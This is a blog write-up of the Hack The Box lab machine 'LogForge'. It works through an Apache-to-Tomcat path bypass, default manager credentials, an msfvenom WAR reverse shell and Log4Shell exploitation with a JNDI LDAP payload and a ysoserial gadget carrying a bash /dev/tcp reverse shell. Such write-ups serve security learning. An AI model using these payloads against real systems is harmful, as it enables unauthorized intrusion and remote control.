<!doctype html><html lang=es><head><title>LogForge | 7Rocky</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Hack The Box. Linux. Medium machine. This machine uses Log4j in a Tomcat server that is vulnerable to JNDI lookup. Then there is an FTP server made in Java that also uses Log4j, but this time it is only vulnerable to information disclosure. Knowlegde about Log4j exploitation, Tomcat, FTP and Wireshark are needed in order to compromise this machine"><meta name=robots content="index, follow"><meta name=image content="https://7rocky.github.io/images/HTB/LogForge/LogForge.png"><meta name=author content="7Rocky"><meta property="og:title" content="LogForge"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine uses Log4j in a Tomcat server that is vulnerable to JNDI lookup. Then there is an FTP server made in Java that also uses Log4j, but this time it is only vulnerable to information disclosure. Knowlegde about Log4j exploitation, Tomcat, FTP and Wireshark are needed in order to compromise this machine"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/logforge/"><meta property="article:section" content="htb"><meta property="article:published_time" content="2021-12-03T00:00:00+01:00"><meta property="article:modified_time" content="2022-03-29T19:33:04+02:00"><meta property="og:site_name" content="7Rocky"><meta property="og:image" content="https://7rocky.github.io/images/HTB/LogForge/LogForge.png"><meta property="og:author" content="7Rocky"><meta itemprop=name content="LogForge"><meta itemprop=description content="Hack The Box. Linux. Medium machine. This machine uses Log4j in a Tomcat server that is vulnerable to JNDI lookup. Then there is an FTP server made in Java that also uses Log4j, but this time it is only vulnerable to information disclosure. Knowlegde about Log4j exploitation, Tomcat, FTP and Wireshark are needed in order to compromise this machine"><meta itemprop=datePublished content="2021-12-03T00:00:00+01:00"><meta itemprop=dateModified content="2022-03-29T19:33:04+02:00"><meta itemprop=wordCount content="1870"><meta itemprop=keywords content="ftp,cve,tomcat,log-poisoning,rce,insecure-deserialization,directory-path-traversal,"><meta name=twitter:card content="summary"><meta name=twitter:title content="LogForge"><meta name=twitter:description content="Hack The Box. Linux. Medium machine. This machine uses Log4j in a Tomcat server that is vulnerable to JNDI lookup. Then there is an FTP server made in Java that also uses Log4j, but this time it is only vulnerable to information disclosure. Knowlegde about Log4j exploitation, Tomcat, FTP and Wireshark are needed in order to compromise this machine"><meta name=twitter:image content="https://7rocky.github.io/images/HTB/LogForge/LogForge.png"><meta name=twitter:author content="7Rocky"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon><link href=/css/style.css rel=stylesheet><link href=/css/monokai-sublime.min.css rel=stylesheet><link href=/css/code.css rel=stylesheet><link href=/css/main.css rel=stylesheet><script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script><script src=/js/main.js></script><div style=display:none>$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$</div></head><body class="ma0 production"><header style=position:sticky;top:0;z-index:9><div class=bg-black><nav class=ph4-ns role=navigation><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href=/en/ title=7Rocky>7Rocky</a><div class="flex-l items-center"><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href=/htb/logforge/ title=es><img alt=es height=30px src=/images/es.png style="border:4px solid#000;border-radius:100%" width=30px></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href title=en><img alt=en height=30px src=/images/en.png width=30px></a><ul class="pl0 ml3 mr3"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/ctf/ title=CTF>CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/htb/ title=HTB>HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href=/en/imc/ title=IMC>IMC</a></li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel=noopener aria-label="follow on GitHub——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class=pb7 role=main><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/logforge/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/logforge/&text=LogForge" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/logforge/&title=LogForge" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">LogForge</h1><time class="f6 mv4 dib tracked" datetime=2021-12-03T00:00:00+01:00>03 / 12 / 2021</time></header><div class=htb-image><img alt=LogForge src=/images/HTB/LogForge/LogForge.png></div><ul class="nested-links tags"><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/ftp title=FTP>FTP</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/cve title=CVE>CVE</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/tomcat title=Tomcat>Tomcat</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/log-poisoning title="Log Poisoning">Log Poisoning</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/rce title="Remote Code Execution">Remote Code Execution</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/insecure-deserialization title="Insecure Deserialization">Insecure Deserialization</a></li><li class=list><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/en/tags/directory-path-traversal title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:5rem><p class="f5 b mb3">Contents of this write-up</p><nav id=TableOfContents><ul><li><a href=#port-scanning>Port scanning</a></li><li><a href=#web-enumeration>Web enumeration</a></li><li><a href=#bypassing-apache-restrictions>Bypassing Apache restrictions</a></li><li><a href=#exploiting-log4j>Exploiting Log4j</a></li><li><a href=#system-enumeration>System enumeration</a></li><li><a href=#exploring-the-ftp-server>Exploring the FTP server</a></li><li><a href=#ldap-exfiltration>LDAP exfiltration</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.11.138</li><li><strong>Release</strong>: 03 / 12 / 2021</li></ul><h2 id=port-scanning>Port scanning</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.138 -p 21,22,80,8080
</span></span><span style=display:flex><span>Nmap scan report for 10.10.11.138
</span></span><span style=display:flex><span>Host is up (0.049s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE    SERVICE    VERSION
</span></span><span style=display:flex><span>21/tcp   filtered ftp
</span></span><span style=display:flex><span>22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
</span></span><span style=display:flex><span>|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
</span></span><span style=display:flex><span>|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
</span></span><span style=display:flex><span>80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Ultimate Hacking Championship
</span></span><span style=display:flex><span>8080/tcp filtered http-proxy
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 11.18 seconds
</span></span></code></pre></div><p>This machine has port 22 (SSH) and 80 (HTTP) open. Ports 21 (FTP) and 8080 (HTTP) are filtered.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.138</code> we will see a page like this:</p><p><img src=/images/HTB/LogForge/LogForge-index.png alt="LogForge index"></p><p>Let&rsquo;s apply fuzzing with <code>ffuf</code> to see if there are some useful routes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.138/FUZZ
</span></span><span style=display:flex><span>images                  [Status: 302, Size: 0, Words: 1, Lines: 1]
</span></span><span style=display:flex><span>admin                   [Status: 403, Size: 277, Words: 20, Lines: 10]
</span></span><span style=display:flex><span>manager                 [Status: 403, Size: 277, Words: 20, Lines: 10]
</span></span><span style=display:flex><span>                        [Status: 200, Size: 489, Words: 23, Lines: 33]
</span></span><span style=display:flex><span>server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
</span></span></code></pre></div><p>Looking at this routes, it seems that the server is running Tomcat. One can verify this searching for a non-existing resource. Namely, <code>/robots.txt</code>:</p><p><img src=/images/HTB/LogForge/LogForge-Tomcat-error.png alt="Tomcat robots.txt"></p><p>It is using Tomcat/9.0.31. However, <code>nmap</code> said that the server is Apache/2.4.41. Also notice that port 8080 was filtered.</p><p>Tomcat&rsquo;s default port is 8080. Maybe the configuration is Apache on port 80 redirecting requests to Tomcat on port 8080. Apache is blocking direct access to <code>/manager</code> (which is the administration panel for Tomcat). This configuration can lead to path traversal issues.</p><h2 id=bypassing-apache-restrictions>Bypassing Apache restrictions</h2><p>Looking at <a href=https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat>HackTricks</a>, we can use <code>/;param=value/manager/html</code> to bypass the Apache blocking configuration and access the Tomcat administration panel. We are asked for credentials, but the default ones (<code>tomcat:tomcat</code>) are correct:</p><p><img src=/images/HTB/LogForge/LogForge-Tomcat-manager.png alt="Tomcat administration panel"></p><p>Now we can perform a common Tomcat exploitation. That is, upload a malicious WAR file to obtain a reverse shell on the server. Let&rsquo;s use <code>msfvenom</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.17.44 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -f war -o rev.war
</span></span><span style=display:flex><span>Payload size: 1106 bytes
</span></span><span style=display:flex><span>Final size of war file: 1106 bytes
</span></span><span style=display:flex><span>Saved as: rev.war
</span></span></code></pre></div><p>And now we can upload it. But, there is an error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>[org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.]
</span></span></code></pre></div><p>As it is shown, the server tells that the maximum size is 1 B. So, we cannot exploit Tomcat in the conventional way.</p><h2 id=exploiting-log4j>Exploiting Log4j</h2><p>We may notice that this error message comes from a log manager such as Log4j. This Java package has the feature to perform JNDI (Java Naming and Directory Interface) lookups. Maybe it is vulnerable to CVE-2021-44228 (Log4Shell).</p><p>Using Burp Suite to examine the POST request to upload the malicious WAR file, we can see that the parameter name is <code>deployWar</code>, which is reflected on the error message. We can change this name to a common Log4j exploit payload (<code>${jndi:ldap://&lt;ip>/a}</code>) and check if we receive a connection.</p><p>For this, we can listen on port 389 (LDAP) using <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>389</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::389
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:389
</span></span></code></pre></div><p>Then we can make the POST request from Burp Suite:</p><p><img src=/images/HTB/LogForge/LogForge-Burp.png alt="Burp Suite"></p><p>And indeed we receive a connection:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>389</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::389
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:389
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.138.
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.138:49432.
</span></span><span style=display:flex><span>0
</span></span><span style=display:flex><span> `
</span></span></code></pre></div><p>Now that we know the server performs JNDI lookups, we can use a malicious LDAP server to inject a serialized Java object that will send us a reverse shell.</p><p>For this purpose, we will be using <a href=https://github.com/pimps/JNDI-Exploit-Kit>JNDI-Exploit-Kit</a> to expose an LDAP server and <a href=https://github.com/pimps/ysoserial-modified>ysoserial-modified</a> to craft the malicious serialized object.</p><p>First, we create the payload:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ echo -n <span style=color:#e6db74>&#39;bash  -i &gt;&amp; /dev/tcp/10.10.17.44/4444 0&gt;&amp;1&#39;</span> | base64
</span></span><span style=display:flex><span>YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ java -jar target/ysoserial-modified.jar CommonsCollections5 bash <span style=color:#e6db74>&#39;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash&#39;</span> &gt; payload.ser
</span></span></code></pre></div><p>And now we start the LDAP server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.17.44:1389 -P payload.ser
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>[HTTP_ADDR] &gt;&gt; 10.10.17.44
</span></span><span style=display:flex><span>[RMI_ADDR]  &gt;&gt; 10.10.17.44
</span></span><span style=display:flex><span>[LDAP_ADDR] &gt;&gt; 10.10.17.44
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>----------------------------JNDI Links----------------------------
</span></span><span style=display:flex><span>Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
</span></span><span style=display:flex><span>rmi://10.10.17.44:1099/fjg93d
</span></span><span style=display:flex><span>Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
</span></span><span style=display:flex><span>rmi://10.10.17.44:1099/v0aeol
</span></span><span style=display:flex><span>ldap://10.10.17.44:1389/v0aeol
</span></span><span style=display:flex><span>Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
</span></span><span style=display:flex><span>rmi://10.10.17.44:1099/znv8ap
</span></span><span style=display:flex><span>ldap://10.10.17.44:1389/znv8ap
</span></span><span style=display:flex><span>Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
</span></span><span style=display:flex><span>rmi://10.10.17.44:1099/twjpgf
</span></span><span style=display:flex><span>ldap://10.10.17.44:1389/twjpgf
</span></span><span style=display:flex><span>Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
</span></span><span style=display:flex><span>rmi://10.10.17.44:1099/hzdycs
</span></span><span style=display:flex><span>ldap://10.10.17.44:1389/hzdycs
</span></span><span style=display:flex><span>Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
</span></span><span style=display:flex><span>rmi://10.10.17.44:1099/w2zulv
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>----------------------------Server Log----------------------------
</span></span><span style=display:flex><span>[JETTYSERVER] &gt;&gt; Listening on 10.10.17.44:8180
</span></span><span style=display:flex><span>[RMISERVER]   &gt;&gt; Listening on 10.10.17.44:1099
</span></span><span style=display:flex><span>[LDAPSERVER]  &gt;&gt; Listening on 0.0.0.0:1389
</span></span></code></pre></div><p>Using Burp Suite again, we can send this JNDI payload: <code>${jndi:ldap://10.10.17.44:1389/twjpgf}</code> in the same POST request and get a connection in <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ nc -nlvp <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style=display:flex><span>Ncat: Listening on :::4444
</span></span><span style=display:flex><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.138.
</span></span><span style=display:flex><span>Ncat: Connection from 10.10.11.138:59150.
</span></span><span style=display:flex><span>bash: cannot set terminal process group (789): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ script /dev/null -c bash
</span></span><span style=display:flex><span>script /dev/null -c bash
</span></span><span style=display:flex><span>Script started, file is /dev/null
</span></span><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ stty raw -echo; fg
</span></span><span style=display:flex><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style=display:flex><span>                                 reset xterm
</span></span><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm
</span></span><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ export SHELL=bash
</span></span><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ stty rows 50 columns 158
</span></span></code></pre></div><h2 id=system-enumeration>System enumeration</h2><p>There is a user called <code>htb</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ ls /home
</span></span><span style=display:flex><span>htb
</span></span></code></pre></div><p>Its home directory is readable, and thus we can read the <code>user.txt</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ ls -la /home/htb
</span></span><span style=display:flex><span>total 24
</span></span><span style=display:flex><span>drwxrwxr-x 1 htb  htb   174 Dec 21 00:53 .
</span></span><span style=display:flex><span>drwxr-xr-x 1 root root    6 Jul  2 18:57 ..
</span></span><span style=display:flex><span>lrwxrwxrwx 1 root root    9 Dec 21 00:52 .bash_history -&gt; /dev/null
</span></span><span style=display:flex><span>-rw-r--r-- 1 htb  htb   220 Feb 25  2020 .bash_logout
</span></span><span style=display:flex><span>-rw-r--r-- 1 htb  htb  3771 Feb 25  2020 .bashrc
</span></span><span style=display:flex><span>drwx------ 1 htb  htb    40 Jul  2 18:58 .cache
</span></span><span style=display:flex><span>-rw-r--r-- 1 htb  htb   807 Feb 25  2020 .profile
</span></span><span style=display:flex><span>-rw-r--r-- 1 htb  htb     0 Jul  2 18:58 .sudo_as_admin_successful
</span></span><span style=display:flex><span>-rw------- 1 htb  htb  3404 Dec 21 00:53 .viminfo
</span></span><span style=display:flex><span>-rw-r--r-- 1 root root   33 Dec 24 05:26 user.txt
</span></span><span style=display:flex><span>tomcat@LogForge:/var/lib/tomcat9$ cat /home/htb/user.txt
</span></span><span style=display:flex><span>6b62392136128e4b1d1c2769fee24010
